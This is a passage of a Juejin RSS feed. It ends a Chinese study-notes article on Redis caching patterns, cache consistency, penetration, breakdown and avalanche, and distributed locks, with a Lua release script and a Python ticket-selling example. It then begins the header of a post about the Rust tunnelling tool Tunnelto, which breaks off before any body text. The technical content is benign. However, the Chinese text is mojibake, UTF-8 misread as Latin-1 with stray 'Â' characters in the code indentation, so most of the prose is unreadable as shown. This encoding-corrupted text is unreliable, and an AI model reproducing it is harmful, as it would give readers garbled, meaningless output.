<p>è¿™ç§æ¨¡å¼çš„ç‰¹ç‚¹åœ¨äºå†™æ“ä½œæ—¶ï¼Œç¼“å­˜å’Œæ•°æ®åº“åŒæ­¥æ›´æ–°ï¼Œç¼“å­˜å’Œæ•°æ®åº“æœ‰ç€éå¸¸å¼ºçš„ä¸€è‡´æ€§ï¼Œå¸¸ç”¨äºæ”¯ä»˜ä¸šåŠ¡çš„æ ¸å¿ƒæ•°æ®ç¼“å­˜ã€‚</p>
</li>
<li>
<p>å†™å›æ¨¡å¼</p>
<p>è¿™ç§æ¨¡å¼æ˜¯å†™ç©¿æ¨¡å¼çš„å¼‚æ­¥ç‰ˆï¼Œå·®å¼‚å°±åœ¨ä¸å†™æ“ä½œæ—¶æ˜¯å¼‚æ­¥çš„ã€‚åœ¨è¯»æ“ä½œæ—¶ï¼Œå’Œè¯»å†™ç©¿é€ã€å†™ç©¿æ¨¡å¼ä¸€æ ·ï¼Œå‘½ä¸­å°±è¿”å›ï¼Œæœªå‘½ä¸­æŸ¥åº“æ›´æ–°ç¼“å­˜åè¿”å›ï¼›åœ¨æ–°å¢å’Œæ›´æ–°çš„å†™æ“ä½œæ—¶ï¼Œç¼“å­˜ç«‹å³è¿”å›ï¼Œç„¶åå¼‚æ­¥å»æ›´æ–°æ•°æ®ã€‚</p>
<p>è¿™ç§æ¨¡å¼é€‚åˆå¹¶å‘é«˜ã€ä¸€è‡´æ€§è¦æ±‚è¾ƒä½çš„åœºæ™¯ï¼Œæ¯”å¦‚æ—¥å¿—ç¼“å­˜ç­‰ã€‚</p>
</li>
</ol>
<p>ç”Ÿäº§æ¨¡å¼ä¸­æ¯”è¾ƒå¸¸ç”¨å’Œæ¨èçš„ï¼Œå°±æ˜¯ç¼“å­˜ç©¿é€æ¨¡å¼ï¼Œç„¶åè¿™ç§æ¨¡å¼åœ¨ä¸€è‡´æ€§çš„é—®é¢˜ä¸Šéœ€è¦é¢å¤–å¤„ç†ã€‚æ¯”å¦‚æœ‰è¿™ä¹ˆå‡ ä¸ªåœºæ™¯ï¼š</p>
<ol start="0">
<li>åœ¨å†™æ“ä½œæ—¶ï¼Œæ­£å¸¸çš„æµç¨‹æ˜¯ï¼Œæ›´æ–°æ•°æ®åº“ï¼Œç„¶ååˆ é™¤ç¼“å­˜ï¼Œæ›´æ–°ç¼“å­˜éœ€è¦ä¸‹æ¬¡è¯»çš„æ—¶å€™å»æŸ¥åº“æ›´æ–°ã€‚ä½†æ˜¯å¦‚æœæ›´æ–°æ•°æ®åº“åï¼Œé‡åˆ°å®•æœºæˆ–è€…ç½‘ç»œå¼‚å¸¸ï¼Œå°±ä¼šå¯¼è‡´ç¼“å­˜æœªåŠæ—¶åˆ é™¤ï¼Œè¿™å°±å‡ºç°äº†è„æ•°æ®ï¼ŒçŸ¥é“ç¼“å­˜è¿‡æœŸã€‚è¿™ä¹Ÿæ˜¯æœ€å¸¸è§çš„ä¸ä¸€è‡´åœºæ™¯ï¼Œå±äºæ“ä½œä¸­æ–­å¯¼è‡´çš„ç¼“å­˜æœªæ›´æ–°ã€‚</li>
<li>åœ¨å¹¶å‘çš„åœºæ™¯ä¸‹ï¼Œå®¢æˆ·ç«¯Aå’Œå®¢æˆ·ç«¯BåŒæ—¶åˆ†åˆ«æ‰§è¡Œè¯»å†™æ“ä½œï¼ŒAè¯»æ“ä½œæ—¶ï¼Œç¼“å­˜æœªå‘½ä¸­å°±ä¼šå»æŸ¥åº“ï¼ŒBå†™æ“ä½œæ—¶æ›´æ–°å®Œæ•°æ®åº“åï¼Œå›å»åˆ é™¤ç¼“å­˜ï¼Œè¿™æ—¶å¦‚æœè¯»æ“ä½œçš„å†™ç¼“å­˜çš„åŠ¨ä½œæ™šäºå†™æ“ä½œçš„åˆ é™¤åŠ¨ä½œï¼Œå°±ä¼šäº§ç”Ÿæ•°æ®åº“ä¸ç¼“å­˜çš„ä¸ä¸€è‡´åœºæ™¯ï¼Œæ•°æ®åº“æ˜¯æ–°çš„æ•°æ®ï¼Œç¼“å­˜ä¸­æ˜¯æ—§çš„è„æ•°æ®ã€‚</li>
</ol>
<p>åœ¨æ•°æ®ä¸€è‡´æ€§ä¸Šæœ‰è¿™æ ·ä¸€ä¸ªåŸåˆ™ï¼Œæœ€ç»ˆæ•°æ®ä¸€è‡´æ€§å³å¯ï¼Œè€Œéå¼ºåˆ¶ä¸€è‡´æ€§ã€‚<code>Redis</code>ä½œä¸ºç¼“å­˜ï¼Œæ˜¯æ²¡æœ‰åŠæ³•å®ç°å’Œæ•°æ®åº“çš„å¼ºä¸€è‡´æ€§ã€‚å› ä¸ºç¼“å­˜å’Œæ•°æ®åº“å±äºä¸¤ä¸ªç‹¬ç«‹çš„å­˜å‚¨ç³»ç»Ÿï¼Œéè¦å¼ºä¸€è‡´æ€§å°±éœ€è¦åŠ é”ï¼Œè¿™å°±ä¼šç‰ºç‰²<code>Redis</code>çš„é«˜æ€§èƒ½ï¼Œè€Œä¸”åœ¨å®é™…ä¸šåŠ¡ä¸­ï¼Œå¸¦çŸ­æš‚çš„ä¸ä¸€è‡´ï¼Œå¯¹äºç”¨æˆ·æ¥è¯´å¹¶æ²¡æœ‰æ„ŸçŸ¥çš„ã€‚</p>
<p>åœ¨ç¼“å­˜ç©¿é€æ¨¡å¼ä¸­ï¼Œæœ‰è¿™ä¹ˆå‡ ä¸ªæ–¹æ¡ˆå¯ä»¥è§£å†³ç¼“å­˜ä¸æ•°æ®åº“çš„ä¸€è‡´æ€§é—®é¢˜</p>
<ol start="0">
<li>
<p>å•å®ä¾‹ä½å¹¶å‘åœºæ™¯ï¼Œåœ¨ä¸€äº›åå°ç®¡ç†ï¼Œå°æµé‡ä¸šåŠ¡æ±‡ä¸­ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ç¼“å­˜ç©¿é€æ¨¡å¼çš„åŸºç¡€é€»è¾‘ï¼Œå³è¯»æ“ä½œæ—¶å…ˆç¼“å­˜åæ•°æ®åº“ï¼Œå¦‚æœä¸å­˜åœ¨å°±å†™ä¸€ä¸ªç¼“å­˜ç©ºå€¼ï¼ŒåŠ ä¸Šè¿‡æœŸæ—¶é—´ï¼›åœ¨å†™æ“ä½œæ—¶ï¼Œå…ˆæ›´æ–°æ•°æ®åº“ï¼Œåœ¨åˆ é™¤ç¼“å­˜ï¼Œç»™æ‰€æœ‰çš„ç¼“å­˜åŠ ä¸Šè¿‡æœŸæ—¶é—´ã€‚</p>
<p>è¿™é‡Œè®¾ç½®ç¼“å­˜ç©ºå€¼ï¼Œå°±æ˜¯ä¸ºäº†é˜²æ­¢ç¼“å­˜æ€æ‰‹-ç©¿é€ï¼Œæ¯”å¦‚æŸ¥è¯¢ä¸€ä¸ªæ•°æ®åº“æ²¡æœ‰çš„å€¼ï¼Œè¿™å°±ä¼šç›´æ¥è®¿é—®æ•°æ®åº“ï¼Œä¸‡ä¸€é‡åˆ°æ¶æ„è®¿é—®çš„è„šæœ¬ï¼Œå°±ä¼šå¯¼è‡´æ•°æ®åº“å‹åŠ›ï¼›è€Œè®¾ç½®ä¸€ä¸ªç©ºå€¼ï¼Œåœ¨è¿‡æœŸæ—¶é—´å†…ï¼Œä»–æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ç¼“å­˜ï¼Œè™½ç„¶æ²¡æœ‰å€¼ï¼Œä½†å‡è½»äº†æ•°æ®åº“çš„å‹åŠ›ï¼Œç®—æ˜¯ä¸ºäº†ç³»ç»Ÿçš„ç¨³å®šæ€§åšäº†ä¸€æ¬¡å…œåº•ã€‚</p>
</li>
<li>
<p>å•å®ä¾‹é«˜å¹¶å‘ï¼Œåœ¨ç”µå•†çš„å•†å“è¯¦æƒ…ã€å•†å“ç§’æ€åº“å­˜ä¸šåŠ¡ä¸­ï¼Œåœ¨åŸºç¡€æ–¹æ¡ˆä¸Šå¢åŠ å»¶è¿Ÿåˆ é™¤ç¼“å­˜ï¼Œæ¥è§£å†³<code>è¯»æ“ä½œå†™ç¼“å­˜æ™šäºå†™æ“ä½œåˆ ç¼“å­˜</code>çš„é—®é¢˜ã€‚ æµç¨‹å°±æ˜¯åœ¨å†™æ“ä½œæ‰§è¡Œæ›´æ–°æ•°æ®åº“åï¼Œå»¶è¿ŸNæ¯«ç§’åˆ é™¤ç¼“å­˜ï¼Œè®©è¯»æ“ä½œæŸ¥åº“ã€å†™ç¼“å­˜çš„åŠ¨ä½œå…ˆå®Œæˆã€‚</p>
</li>
</ol>
<p>è¿˜æœ‰ä¸€ä¸ªå¸¸è§çš„å…«è‚¡æ–‡ï¼šç¼“å­˜çš„ä¸‰å¤§æ€æ‰‹ï¼Œç©¿é€ã€å‡»ç©¿å’Œé›ªå´©ã€‚</p>
<ol start="0">
<li>
<p>ç©¿é€ï¼Œåœ¨å‰é¢çš„ç©¿é€æ¨¡å¼æ—¶ä»‹ç»è¿‡äº†ï¼Œå°±æ˜¯æŸ¥è¯¢ä¸€äº›æ•°æ®åº“ä¸­ä¸å­˜åœ¨çš„å€¼æ—¶ï¼Œæ¯æ¬¡éƒ½ä¼šå»æŸ¥è¯¢æ•°æ®åº“ï¼Œå¯¼è‡´ç¼“å­˜å¤±æ•ˆï¼Œæ•°æ®åº“å¢åŠ é¢å¤–çš„å‹åŠ›ã€‚è§£å†³æ–¹æ¡ˆæœ‰ä¸‹é¢å‡ ç§ï¼š</p>
<p>1ï¼‰è®¾ç½®ç©ºå€¼ï¼Œå‰é¢ä¹Ÿä»‹ç»è¿‡ï¼Œè¿™æ˜¯æœ€ç®€é€šç”¨çš„æ–¹æ¡ˆ</p>
<p>2ï¼‰å¸ƒéš†è¿‡æ»¤å™¨ï¼Œæå‰å°†æ•°æ®åº“ä¸­æ‰€æœ‰çš„åˆæ³•keyå­˜å…¥è¿‡æ»¤å™¨ï¼Œè¯·æ±‚å…ˆè¿‡è¿‡æ»¤å™¨ï¼Œåˆ¤å®šä¸å­˜åœ¨å°±ä¼šç›´æ¥æ‹’ç»ï¼Œå°±èµ°ä¸åˆ°ç¼“å­˜å’Œæ•°æ®åº“äº†</p>
<p>3ï¼‰IP/æ¥å£ é™æµç†”æ–­ï¼Œå¯¹äºç©¿é€è¯·æ±‚é«˜é¢‘çš„IPé™æµï¼Œå¯¹æŸ¥è¯¢æ¥å£åšç†”æ–­ä¿æŠ¤ã€‚è¿™é‡Œçš„é™æµå°±æ˜¯é™åˆ¶å•ä½æ—¶é—´å†…å…è®¸è¯·æ±‚çš„æ•°é‡ï¼Œæ¯”å¦‚å•ä½æ—¶é—´å†…æŸä¸ªIPå¤§é‡è¯·æ±‚ä¸å­˜åœ¨çš„IDï¼ŒåŠ äº†é™æµä¹‹åç›´æ¥å›æŠ¥é”™429é”™è¯¯ç ï¼Œå°±èµ°ä¸åˆ°ç¼“å­˜ã€æ•°æ®åº“äº†ï¼›ç†”æ–­å°±æ˜¯å½“ä¸‹æ¸¸æœåŠ¡å™¨æŒç»­å¤±è´¥æˆ–è€…è¿‡æ…¢æ—¶ï¼Œæš‚æ—¶åˆ‡æ–­è¯·æ±‚ï¼Œé˜²æ­¢é›ªå´©æ‰©æ•£ã€‚</p>
</li>
<li>
<p>å‡»ç©¿ï¼ŒæŸä¸ªæé«˜çš„çƒ­ç‚¹keyï¼Œæ°å¥½è¿‡æœŸæˆ–è€…è¢«åˆ é™¤ï¼Œæ­¤æ—¶å¤§é‡å¹¶å‘è¯·æ±‚åŒæ—¶è®¿é—®è¯¥keyï¼Œå…¨éƒ¨ç¼“å­˜æœªå‘½ä¸­ï¼Œæ‰€æœ‰çš„è¯·æ±‚éƒ½ä¼šè®¿é—®åˆ°æ•°æ®åº“ã€‚è¿™é‡Œçš„è§£å†³æ–¹æ¡ˆæœ‰ï¼šäº’æ–¥é”ä¸²è¡Œé‡å»ºç¼“å­˜ï¼Œçƒ­ç‚¹keyæ°¸ä¸è¿‡æœŸï¼Œçƒ­ç‚¹keyä¸»åŠ¨æ›´æ–°</p>
</li>
<li>
<p>é›ªå´©ï¼Œå¤§é‡ç¼“å­˜keyåœ¨åŒä¸€æ—¶é—´é›†ä½“è¿‡æœŸï¼Œæˆ–è€…<code>Redis</code>ç¼“å­˜é›†ä½“å®•æœºï¼Œå¯¼è‡´è¯·æ±‚ç»•è¿‡ç¼“å­˜ç›´æ¥è®¿é—®æ•°æ®åº“ï¼Œå¯¼è‡´æ•°æ®åº“è´Ÿè½½ç¬é—´çˆ†è¡¨ï¼Œå¼•å‘æ•´ä¸ªæœåŠ¡é“¾è·¯é›ªå´©ã€‚è§£å†³æ–¹æ¡ˆæœ‰ï¼šè¿‡æœŸæ—¶é—´éšæœºåŒ–ï¼Œ<code>Redis</code>é›†ç¾¤é«˜å¯ç”¨ï¼ŒæœåŠ¡é™æµã€ç†”æ–­ã€é™çº§ã€‚</p>
</li>
</ol>
<h4 data-id="heading-18">8. åˆ†å¸ƒå¼é”</h4>
<p>åœ¨åˆ†å¸ƒå¼ã€å¾®æœåŠ¡æ¶æ„ä¸­ï¼Œä¸€ä¸ªæœåŠ¡ä¼šè¿è¡Œåœ¨å¤šå°æœºå™¨ä¸Šï¼Œè¿™å°±æ˜¯å¤šè¿›ç¨‹çš„æ¦‚å¿µï¼Œå¤šå°æœºå™¨ä¼šå…±äº«ä¸€ä¸ªèµ„æºï¼Œè¿™ä¸ªæ—¶å€™pythonçš„çº¿ç¨‹é”å°±ä¼šå¤±æ•ˆï¼Œå› ä¸ºè¿™äº›é”çš„ä½œç”¨èŒƒå›´æ˜¯å½“å‰è¿›ç¨‹çš„å†…å­˜ï¼Œåªèƒ½ç®¡è‡ªå·±è¿›ç¨‹å†…çš„çº¿ç¨‹ã€‚è¿™æ—¶å°±éœ€è¦åˆ†å¸ƒå¼é”äº†ï¼Œåˆ†å¸ƒå¼é”å°±æ˜¯è·¨è¿›ç¨‹ã€è·¨æœåŠ¡çš„é”ï¼Œè¦ä¿è¯å¤šä¸ªè¿›ç¨‹å¯¹å…±äº«èµ„æºçš„äº’æ–¥è®¿é—®ã€‚</p>
<p>åˆ†å¸ƒå¼é”æœ‰å››ä¸ªæ ¸å¿ƒçš„ç‰¹æ€§ï¼š</p>
<ol>
<li>äº’æ–¥æ€§ï¼ŒåŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªå®¢æˆ·ç«¯æŒæœ‰é”ï¼Œå…¶ä»–çš„å®¢æˆ·ç«¯å¿…é¡»ç­‰å¾…</li>
<li>å®‰å…¨æ€§ï¼Œé”åªèƒ½è¢«å…¶æŒæœ‰è€…é‡Šæ”¾ï¼Œä¸èƒ½è¢«å…¶ä»–å®¢æˆ·ç«¯è¯¯åˆ </li>
<li>é¿å…æ­»é”ï¼Œå³ä½¿æŒæœ‰é”çš„å®¢æˆ·ç«¯å´©æºƒã€ä¸­æ–­ï¼Œä¹Ÿå¯ä»¥åœ¨ä¸€å®šæ—¶é—´åè‡ªåŠ¨é‡Šæ”¾</li>
<li>å¯ç”¨æ€§ï¼Œ<code>Redis</code>é›†ç¾¤ç¯å¢ƒä¸‹ï¼Œé”æœåŠ¡ä¸èƒ½å•ç‚¹æ•…éšœï¼Œè¦ä¿è¯å¤§éƒ¨åˆ†èŠ‚ç‚¹å¯ç”¨</li>
</ol>
<p><code>Redis</code>åšåˆ†å¸ƒå¼é”çš„ä¼˜ç‚¹ï¼Œå°±åœ¨äºå…¶æ€§èƒ½æé«˜ï¼Œè·å–ã€é‡Šæ”¾é”éƒ½æ˜¯æ¯«ç§’çº§ï¼Œè€Œä¸”éƒ¨ç½²ä¹Ÿæ¯”è¾ƒç®€å•ã€‚</p>
<p>æ¥ä¸‹æ¥ä»‹ç»ä¸‹<code>Redis</code>å•èŠ‚ç‚¹åˆ†å¸ƒå¼é”çš„å‡ ä¸ªå‘½ä»¤ï¼š</p>
<ol>
<li>key é”çš„å”¯ä¸€æ ‡è¯†ï¼Œæ¯”å¦‚è¦ç»™ID=111çš„èµ„æºåŠ é”</li>
<li>value å®¢æˆ·ç«¯çš„å”¯ä¸€æ ‡è¯†ï¼Œä¿è¯é”åªèƒ½è¢«æŒæœ‰è€…é‡Šæ”¾</li>
<li>NX å…¨ç¨‹<code>Not Exist</code>ï¼Œåªæœ‰å½“keyä¸å­˜åœ¨æ—¶æ‰ä¼šè®¾ç½®æˆåŠŸ</li>
<li>EX/PX è®¾ç½®çš„è¿‡æœŸæ—¶é—´ï¼ŒEXå•ä½æ˜¯ç§’ï¼ŒPXå•ä½æ˜¯æ¯«ç§’</li>
<li>timeout é”çš„è¿‡æœŸæ—¶é—´ï¼Œé¿å…æ­»é”</li>
</ol>
<p>æ¯”å¦‚è¿™è¡Œä»£ç ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SET</span> lock:<span class="hljs-keyword">order</span>:<span class="hljs-number">123</span> uuid:<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.100</span> NX EX <span class="hljs-number">30</span>
</code></pre>
<p>å°±è¡¨æ˜ç»™èµ„æºkeyä¸ºlock:order:123çš„èµ„æºåŠ é”ï¼Œé”çš„æŒæœ‰è€…æ˜¯uuid:192.168.1.100ï¼Œ30ç§’åè¿‡æœŸ</p>
<p>è€Œé‡Šæ”¾é”ï¼Œå°±å›åˆ°åˆšåˆšçš„å®‰å…¨æ€§äº†ï¼Œå¿…é¡»åªæœ‰é”çš„æŒæœ‰å®¢æˆ·ç«¯æ‰å¯ä»¥é‡Šæ”¾ã€‚æµç¨‹å°±æ˜¯å…ˆåˆ¤æ–­åŠ é”çš„å®¢æˆ·ç«¯æ˜¯ä¸æ˜¯è‡ªå·±ï¼Œå¦‚æœæ˜¯æ‰å¯ä»¥å»é‡Šæ”¾ï¼Œçœ‹ä¸‹ç›¸å…³çš„Iuaè„šæœ¬ï¼š</p>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-keyword">if</span> redis.call(<span class="hljs-string">'GET'</span>, KEYS[<span class="hljs-number">1</span>]) == ARGV[<span class="hljs-number">1</span>] <span class="hljs-keyword">then</span>
 Â  Â <span class="hljs-keyword">return</span> redis.call(<span class="hljs-string">'DEL'</span>, KEYS[<span class="hljs-number">1</span>]) Â <span class="hljs-comment">-- æ ‡è¯†åŒ¹é…ï¼Œåˆ é™¤é”</span>
<span class="hljs-keyword">else</span>
 Â  Â <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> Â <span class="hljs-comment">-- æ ‡è¯†ä¸åŒ¹é…ï¼Œä¸åšä»»ä½•æ“ä½œ</span>
<span class="hljs-keyword">end</span>
</code></pre>
<p>ä¹‹å‰å†™è¿‡ä¸€ä¸ªå–ç¥¨çš„å‡½æ•°ï¼Œå°±æ˜¯ä½¿ç”¨<code>Redis</code>çš„åˆ†å¸ƒå¼é”æ¥æ§åˆ¶åº“å­˜ï¼Œé˜²æ­¢è¶…å–ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">sell_one_with_lock</span>(<span class="hljs-params">r: Redis, window_name: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:
 Â  Â <span class="hljs-string">"""ä½¿ç”¨ Redis åˆ†å¸ƒå¼é”ä¿æŠ¤â€œæ£€æŸ¥+æ‰£å‡â€å…³é”®åŒºï¼ŒæˆåŠŸå–å‡ºè¿”å› Trueï¼Œå”®ç½„æˆ–å¤±è´¥è¿”å› Falseã€‚"""</span>
 Â  Â lock = r.lock(LOCK_KEY, timeout=<span class="hljs-number">5</span>, blocking_timeout=<span class="hljs-number">1</span>) Â <span class="hljs-comment"># è¶…æ—¶æ—¶é—´ä¸è·å–ç­‰å¾…æ—¶é—´å¯è°ƒ</span>
 Â  Â acquired = <span class="hljs-keyword">await</span> lock.acquire(blocking=<span class="hljs-literal">True</span>)
 Â  Â <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> acquired:
 Â  Â  Â  Â <span class="hljs-comment"># æœªæ‹¿åˆ°é”ï¼Œè§†ä¸ºæœ¬æ¬¡å–ç¥¨å¤±è´¥ï¼ˆå¯é‡è¯•ï¼‰</span>
 Â  Â  Â  Â <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
 Â  Â <span class="hljs-keyword">try</span>:
 Â  Â  Â  Â <span class="hljs-comment"># å…³é”®åŒºï¼šè¯»å–å‰©ä½™ã€åˆ¤å®šã€æ‰£å‡</span>
 Â  Â  Â  Â remaining_str = <span class="hljs-keyword">await</span> r.get(TICKET_KEY)
 Â  Â  Â  Â remaining = <span class="hljs-built_in">int</span>(remaining_str) <span class="hljs-keyword">if</span> remaining_str <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>
 Â  Â  Â  Â <span class="hljs-keyword">if</span> remaining &lt;= <span class="hljs-number">0</span>:
 Â  Â  Â  Â  Â  Â <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
 Â  Â  Â  Â <span class="hljs-comment"># æ‰£å‡ä¸€å¼ ï¼ˆåŸå­è‡ªå‡å‘½ä»¤ï¼‰</span>
 Â  Â  Â  Â <span class="hljs-keyword">await</span> r.decr(TICKET_KEY)
 Â  Â  Â  Â <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
 Â  Â <span class="hljs-keyword">finally</span>:
 Â  Â  Â  Â <span class="hljs-keyword">try</span>:
 Â  Â  Â  Â  Â  Â <span class="hljs-keyword">await</span> lock.release()
 Â  Â  Â  Â <span class="hljs-keyword">except</span> Exception:
 Â  Â  Â  Â  Â  Â <span class="hljs-comment"># è‹¥é”å·²è¿‡æœŸæˆ–å…¶ä»–å¼‚å¸¸ï¼Œå¿½ç•¥é‡Šæ”¾é”™è¯¯</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-keyword">pass</span>
â€‹
</code></pre>
<p>ä»£ç ç¬¬ä¸€è¡Œå°±åˆ›å»ºäº†ä¸€ä¸ªåˆ†å¸ƒå¼é”ï¼Œä¼ å…¥äº†ä¸€ä¸ªè¿‡æœŸæ—¶é—´é˜²æ­¢æ­»é”ï¼Œ<code>lock.acquire</code>æ˜¯çœŸæ­£çš„åŠ é”æ­¥éª¤ã€‚ä¹‹å‰çœ‹åˆ°è¿™é‡Œæœ‰ä¸ªç–‘æƒ‘ï¼šæ¯æ¬¡è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªåˆ†å¸ƒå¼é”ï¼Œå¦‚ä½•ä¿è¯å¯¹ä¸€ä¸ªèµ„æºåŠ é”ï¼Œåœ¨åˆ›å»ºé”çš„æ—¶å€™ä¼ å…¥äº†<code>LOCK_KEY</code>ï¼Œè¿™ä¸ªå°±æ˜¯è¦åŠ é”çš„keyï¼Œä¹Ÿå°±æ˜¯è¦åŠ é”çš„èµ„æºï¼Œè¿™ä¸ªæ–¹æ³•æ¯æ¬¡æ‰§è¡Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªé”ï¼Œä½†æ˜¯<code>lock.acquire</code>åœ¨èµ„æºæ²¡æœ‰é‡Šæ”¾çš„æ—¶å€™ï¼Œè¿”å›çš„æ˜¯falseï¼Œä¹Ÿå°±æ˜¯ä¼šèµ°åˆ°<code>if not</code>è¿™é‡Œçš„ã€‚</p>
<p>å…¶å®åç»­ç« èŠ‚è¿˜æœ‰å•ç‚¹æ•…éšœï¼Œä¸»ä»ã€å“¨å…µã€ <code>Redlock</code>ã€ æ‰©å®¹ã€æ•°æ®åˆ†ç‰‡ç­‰ï¼Œè§‰å¾—åˆ†å¸ƒå¼ã€ç¼“å­˜è¿˜éœ€è¦æ¶ˆåŒ–ä¸‹ï¼Œåé¢å°±ä¸åœ¨æ·±å…¥äº†ï¼Œæ‰“ç®—è¿›å…¥å®æˆ˜ç¯èŠ‚äº†ï¼Œåç»­æ‰“ç®—è®¾è®¡ä¸‰ä¸ªå®æˆ˜é¡¹ç›®æ¥è¿›ä¸€æ­¥æ·±å…¥çš„å­¦ä¹ ä¸‹ã€‚</p>
<p>ä¸‰ä¸ªå®æˆ˜é¡¹ç›®åˆ†åˆ«æ˜¯</p>
<ol>
<li>ä¿¡æ¯æŸ¥è¯¢ç³»ç»Ÿï¼Œä½¿ç”¨<code>MySQL</code>å­˜å‚¨ç”¨æˆ·ä¿¡æ¯ï¼Œ<code>Redis</code>ä½œä¸ºç¼“å­˜ï¼Œå·©å›ºä¸‹å‰é¢å­¦ä¹ çš„ç¼“å­˜æ¨¡å¼ï¼ŒåŒæ—¶åŠ ä¸Šå‹æµ‹ç¯èŠ‚ï¼Œé€šè¿‡QPSï¼Œå“åº”æ—¶é—´æ›´åŠ ç›´è§‚çš„äº†è§£ç¼“å­˜çš„æ„ä¹‰</li>
<li>æŠ¢ç¥¨ç³»ç»Ÿï¼Œå­¦ä¹ ä¸‹Luaè„šæœ¬ï¼Œ</li>
<li>ç§’æ€ç³»ç»Ÿï¼Œå­¦ä¹ ä¸‹é«˜å¹¶å‘å¤„ç†ã€é™æµã€é˜²è¶…å–ç­–ç•¥</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€å¤©ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼ˆç¬¬13ç¯‡ï¼‰ï¼šTunnelto - ç”¨Rustæ‰“é€ çš„é«˜æ€§èƒ½å†…ç½‘ç©¿é€å·¥å…·]]></title>    <link>https://juejin.cn/post/7603221478473351210</link>    <guid>https://juejin.cn/post/7603221478473351210</guid>    <pubDate>2026-02-05T12:00:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603221478473351210" data-draft-id="7603221478473334826" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€å¤©ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼ˆç¬¬13ç¯‡ï¼‰ï¼šTunnelto - ç”¨Rustæ‰“é€ çš„é«˜æ€§èƒ½å†…ç½‘ç©¿é€å·¥å…·"/> <meta itemprop="keywords" content="å¼€æº,å‰ç«¯,åç«¯"/> <meta itemprop="datePublished" content="2026-02-05T12:00:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†¬å¥‡Lab"/> <meta itemprop="url" content="https://juejin.cn/user/1857501105781193"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€å¤©ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼ˆç¬¬13ç¯‡ï¼‰ï¼šTunnelto - ç”¨Rustæ‰“é€ çš„é«˜æ€§èƒ½å†…ç½‘ç©¿é€å·¥å…·
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1857501105781193/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†¬å¥‡Lab
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T12:00:54.000Z" title="Thu Feb 05 2026 12:00:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
